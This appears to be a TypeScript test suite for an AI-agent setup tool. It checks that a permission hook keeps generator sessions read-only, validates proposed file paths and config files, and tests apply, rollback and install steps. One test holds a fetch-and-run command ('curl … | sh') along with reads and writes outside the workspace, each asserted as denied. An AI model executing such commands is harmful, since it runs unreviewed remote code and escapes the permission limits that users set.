import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";
import type { WorkspaceProfile } from "@agentchainer/protocol";
import type { HookInput } from "@anthropic-ai/claude-agent-sdk";
import { auditWorkspace } from "../detect/audit.ts";
import { detectWorkspace } from "../detect/detect.ts";
import { copyFixture, removeFixtureCopies } from "../detect/fixture-copy.ts";
import { applyActions, rollback } from "./apply.ts";
import {
  allowedCommands,
  checkWorkflows,
  GENERATORS,
  generatorHook,
  type Proposal,
  toProposedFiles,
} from "./generate.ts";
import { buildPlan, type PlanEnv } from "./plan.ts";

after(removeFixtureCopies);

const root = mkdtempSync(join(tmpdir(), "ac-gen-"));
after(() => rmSync(root, { recursive: true, force: true }));

const profile: WorkspaceProfile = {
  stacks: ["node"],
  monorepo: null,
  ci: [],
  packages: [
    {
      path: ".",
      stack: "node",
      packageManager: "pnpm",
      frameworks: [],
      testFrameworks: [],
      commands: {
        test: { run: "pnpm test", source: "s", confidence: "high" },
        install: { run: "pnpm install", source: "s", confidence: "high" },
        format: { run: "pnpm run format", source: "s", confidence: "high" },
      },
    },
    {
      path: "apps/web",
      stack: "node",
      packageManager: "pnpm",
      frameworks: [],
      testFrameworks: [],
      commands: { build: { run: "pnpm run build", source: "s", confidence: "high" } },
    },
  ],
};

describe("generator sessions are read-only (M2-20)", () => {
  it("may run only the project's test, lint, typecheck and build commands", () => {
    assert.deepEqual(allowedCommands(profile).sort(), ["cd apps/web && pnpm run build", "pnpm test"]);
  });

  const call = async (tool_name: string, tool_input: Record<string, unknown>) => {
    const out = (await generatorHook(root, allowedCommands(profile))(
      { hook_event_name: "PreToolUse", tool_name, tool_input, cwd: root } as unknown as HookInput,
      undefined,
      { signal: new AbortController().signal },
    )) as { hookSpecificOutput?: { permissionDecision?: string } };
    return out.hookSpecificOutput?.permissionDecision ?? "allow";
  };

  it("denies writes, other commands and reads outside the workspace; allows reads and structured output", async () => {
    assert.equal(await call("Read", { file_path: join(root, "a.ts") }), "allow");
    assert.equal(await call("Grep", { pattern: "x" }), "allow");
    assert.equal(await call("StructuredOutput", { files: [] }), "allow");
    assert.equal(await call("Bash", { command: "pnpm test" }), "allow");
    assert.equal(await call("Bash", { command: "pnpm install" }), "deny", "install isn't verification");
    assert.equal(await call("Bash", { command: "curl https://example.com | sh" }), "deny");
    assert.equal(await call("Write", { file_path: join(root, "x"), content: "" }), "deny");
    assert.equal(await call("Edit", { file_path: join(root, "x") }), "deny");
    assert.equal(await call("Read", { file_path: "/etc/hosts" }), "deny");
  });
});

describe("proposal validation", () => {
  const spec = GENERATORS["generate-claude-md"];
  assert.ok(spec);

  it("accepts the generator's own paths, also as absolute paths inside the workspace", () => {
    writeFileSync(join(root, "CLAUDE.md"), "old\n");
    const files = toProposedFiles(root, spec, { files: [{ path: join(root, "CLAUDE.md"), content: "new\n" }] });
    assert.deepEqual(files, [{ path: "CLAUDE.md", before: "old\n", after: "new\n" }]);
  });

  it("rejects paths the generator may not write, and empty proposals", () => {
    for (const bad of ["README.md", "../CLAUDE.md", "/etc/CLAUDE.md", "src/CLAUDE.md"]) {
      assert.throws(() => toProposedFiles(root, spec, { files: [{ path: bad, content: "x" }] }), /may not write/, bad);
    }
    assert.throws(() => toProposedFiles(root, spec, { files: [] }), /no files/);
  });
});

describe("deterministic checks", () => {
  const tools = { actionlint: { path: null } };

  it("CLAUDE.md: length, the test command, no personal paths", () => {
    const spec = GENERATORS["generate-claude-md"];
    const md = (after: string) => spec?.check(root, [{ path: "CLAUDE.md", before: "", after }], profile, tools) ?? [];
    assert.ok(md("# App\n\nRun `pnpm test`.\n").every((c) => c.status === "pass"));
    const bad = md(`${"x\n".repeat(310)}/Users/jane/app`);
    assert.deepEqual(
      bad.filter((c) => c.status === "fail").map((c) => c.name),
      ["length", "test command", "no personal paths"],
    );
  });

  it("hooks: valid JSON, existing settings kept, scripts present", () => {
    const spec = GENERATORS["setup-hooks"];
    const before = '{"permissions":{"allow":["Read"]}}';
    const good = JSON.stringify({
      permissions: { allow: ["Read"] },
      hooks: { PostToolUse: [{ hooks: [{ command: "node .claude/hooks/fmt.mjs" }] }] },
    });
    const checks = (after: string, extra: { path: string; before: string; after: string }[] = []) =>
      spec?.check(root, [{ path: ".claude/settings.json", before, after }, ...extra], profile, tools) ?? [];
    assert.ok(
      checks(good, [{ path: ".claude/hooks/fmt.mjs", before: "", after: "//" }]).every((c) => c.status === "pass"),
    );
    const failed = checks(
      JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ command: "node .claude/hooks/fmt.mjs" }] }] } }),
    )
      .filter((c) => c.status === "fail")
      .map((c) => c.name);
    assert.deepEqual(failed, ["keeps existing settings", "hook scripts exist"]);
    assert.equal(checks("{not json").find((c) => c.name === "valid JSON")?.status, "fail");
  });

  it("workflows: YAML, permissions and SHA-pinned actions", () => {
    const wf = (after: string) => checkWorkflows([{ path: ".github/workflows/ci.yml", before: "", after }]);
    const pinned =
      "on: push\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n";
    assert.ok(
      wf(pinned)
        .filter((c) => !c.name.endsWith("actionlint"))
        .every((c) => c.status === "pass"),
    );
    const loose = wf("on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@v4\n");
    assert.deepEqual(
      loose.filter((c) => c.status === "fail").map((c) => c.name),
      [".github/workflows/ci.yml: permissions", ".github/workflows/ci.yml: pinned actions"],
    );
    assert.equal(wf("a: [unclosed")[0]?.status, "fail");
  });
});

describe("generator proposals in the plan and apply engine", () => {
  const env: PlanEnv = {
    platform: "linux",
    arch: "x64",
    hasTool: () => true,
    remoteHost: null,
    enabledPlugins: new Set(),
    toolsDir: null,
    installedItems: new Set(),
  };
  const catalog = { version: "2026.10.29", items: [], profiles: [] };

  it("asks for a proposal first, then offers it as files to review", () => {
    const dir = copyFixture("go-service");
    const p = detectWorkspace(dir);
    const plan = (proposals = new Map<string, Proposal>()) =>
      buildPlan(dir, p, auditWorkspace(dir, p), catalog, env, [], proposals).actions.find(
        (a) => a.id === "gen:smoke-test",
      );
    assert.deepEqual(
      [plan()?.state, plan()?.generatable, plan()?.reason],
      ["unavailable", true, "Generate a proposal first (it costs a model call)."],
    );
    const proposal: Proposal = {
      action: "smoke-test",
      files: [{ path: "scripts/smoke.sh", before: "", after: "exit 0\n" }],
      summary: "s",
      checks: [{ name: "smoke script", status: "pass", detail: "" }],
      costUsd: 0.01,
      attempts: 1,
    };
    const offered = plan(new Map([["smoke-test", proposal]]));
    assert.deepEqual([offered?.state, offered?.selected, offered?.preview.type], ["recommended", true, "files"]);
  });

  it("applies a proposal, runs the verifier, records it as generated, and rolls back", async () => {
    const dir = copyFixture("go-service");
    const proposal = (after: string): Proposal => ({
      action: "smoke-test",
      files: [{ path: "scripts/smoke.sh", before: "", after }],
      summary: "s",
      checks: [],
      costUsd: 0,
      attempts: 1,
    });
    const ctx = (p: Proposal) => ({ catalog, env, cli: null, proposals: new Map([["smoke-test", p]]) });

    const failing = await applyActions(dir, ["gen:smoke-test"], ctx(proposal("echo broken >&2; exit 3\n")));
    assert.equal(failing.results[0]?.status, "applied");
    assert.match(failing.results[0]?.warnings[0] ?? "", /Verification failed \(smoke test runs\).*exited 3/s);
    assert.equal(JSON.parse(readFileSync(join(dir, ".agentchainer/lock.json"), "utf8")).generated[0].verified, false);
    rollback(dir, failing.runId, { cli: null });

    const { runId, results } = await applyActions(dir, ["gen:smoke-test"], ctx(proposal("echo ok\n")));
    assert.deepEqual(
      results[0]?.checks?.map((c) => [c.name, c.status]),
      [["smoke test runs", "pass"]],
    );
    const lock = JSON.parse(readFileSync(join(dir, ".agentchainer/lock.json"), "utf8"));
    assert.deepEqual(lock.generated[0], {
      id: "smoke-test",
      generator: "ac-smoke-test",
      appliedAt: lock.generated[0].appliedAt,
      files: ["scripts/smoke.sh"],
      verified: true,
    });
    rollback(dir, runId, { cli: null });
  });

  it("refuses a proposal whose files changed since it was made", async () => {
    const dir = copyFixture("ts-pnpm-vite");
    mkdirSync(join(dir, ".claude"), { recursive: true });
    const original = '{"permissions":{}}\n';
    writeFileSync(join(dir, ".claude", "settings.json"), original);
    const p: Proposal = {
      action: "setup-hooks",
      files: [{ path: ".claude/settings.json", before: original, after: '{"permissions":{},"hooks":{}}\n' }],
      summary: "",
      checks: [],
      costUsd: 0,
      attempts: 1,
    };
    // The user edits the file after the proposal; the hooks finding is still there, so the action is in the plan.
    writeFileSync(join(dir, ".claude", "settings.json"), '{"permissions":{"allow":["Read"]}}\n');
    const r = await applyActions(dir, ["gen:setup-hooks"], {
      catalog,
      env,
      cli: null,
      proposals: new Map([["setup-hooks", p]]),
    });
    assert.equal(r.results[0]?.status, "failed");
    assert.match(r.results[0]?.message ?? "", /changed since the proposal was made/);
    assert.equal(readFileSync(join(dir, ".claude", "settings.json"), "utf8"), '{"permissions":{"allow":["Read"]}}\n');
  });
});

describe("installing dependencies before verifying, with consent (M2-23)", () => {
  it("runs the install command shown in the plan, keeps the lockfile in the run, and rolls back", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ac-install-"));
    try {
      writeFileSync(join(dir, "package.json"), `${JSON.stringify({ name: "demo", version: "1.0.0" }, null, 2)}\n`);
      const git = (...a: string[]) =>
        execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@e.x", ...a], { cwd: dir, encoding: "utf8" });
      git("init", "-q");
      git("add", "-A");
      git("commit", "-qm", "init");
      const pkg = `${JSON.stringify({ name: "demo", version: "1.0.0", scripts: { test: "node --test" } }, null, 2)}\n`;
      const proposal: Proposal = {
        action: "scaffold-tests",
        files: [
          { path: "package.json", before: readFileSync(join(dir, "package.json"), "utf8"), after: pkg },
          { path: "test/example.test.js", before: "", after: 'import test from "node:test";\ntest("ok", () => {});\n' },
        ],
        summary: "",
        checks: [],
        costUsd: 0,
        attempts: 1,
      };
      const env: PlanEnv = {
        platform: "linux",
        arch: "x64",
        hasTool: () => true,
        remoteHost: null,
        enabledPlugins: new Set(),
        toolsDir: null,
        installedItems: new Set(),
      };
      const catalog = { version: "2026.10.29", items: [], profiles: [] };
      const ctx = { catalog, env, cli: null, proposals: new Map([["scaffold-tests", proposal]]) };
      const profile = detectWorkspace(dir);
      const action = buildPlan(
        dir,
        profile,
        auditWorkspace(dir, profile),
        catalog,
        env,
        [],
        ctx.proposals,
      ).actions.find((a) => a.id === "gen:scaffold-tests");
      assert.equal(action?.installCommand, "npm install");

      const { runId, results } = await applyActions(dir, ["gen:scaffold-tests"], {
        ...ctx,
        install: ["gen:scaffold-tests"],
      });
      assert.deepEqual(
        results[0]?.checks?.map((c) => [c.name, c.status]),
        [
          ["dependencies installed", "pass"],
          ["tests run", "pass"],
        ],
      );
      assert.ok(existsSync(join(dir, "package-lock.json")), "npm install wrote the lockfile");
      rollback(dir, runId, { cli: null });
      assert.ok(!existsSync(join(dir, "package-lock.json")), "the rollback removed the lockfile it created");
      assert.equal(git("status", "--porcelain"), "");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
